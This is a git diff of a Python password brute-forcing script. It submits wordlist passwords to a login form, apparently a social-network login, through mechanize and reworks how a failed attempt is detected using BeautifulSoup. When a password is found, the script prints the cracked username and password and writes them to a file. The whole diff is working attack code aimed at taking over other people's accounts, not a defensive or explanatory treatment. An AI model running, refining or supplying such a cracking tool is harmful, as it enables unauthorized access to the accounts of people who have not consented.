@@ -81,18 +81,21 @@ def def_login():
 	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
 			browser.form['pass'] = str(password)
 			request = browser.submit()
-
-			# Find action="/login.php?login_attempt= using beautiful soup
+			browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+			# Declare a BeautifulSoup Object.
 			soup = BeautifulSoup(request, 'html.parser')
 
 			# Attempt to brute force the password.
-			attempt = soup.find("div",{"class":"fsl fwb fcb"}).text
-			if (len(attempt) > 0):
+			try:
+
+				action = soup.find('form', id='login_form').get('action')
+				color_print(action, color='red')
 				print("[!] Wrong password")
 				browser.select_form(nr = 0)
 	       			line = fp.readline()
-				continue
-			else:
+				continue	
+			except AttributeError:
+
 				# Password found, Yey!!
 				username = configParser.get('Config', 'user')	
 				color_print("Password Cracked - Username: " + username + " Password: " + password, color='green')
@@ -101,7 +104,6 @@ def def_login():
 				saveCreds.write(username + '\n')
 				saveCreds.write(password)
 				saveCreds.close()
-				
 				break
 
 			browser.select_form(nr = 0)
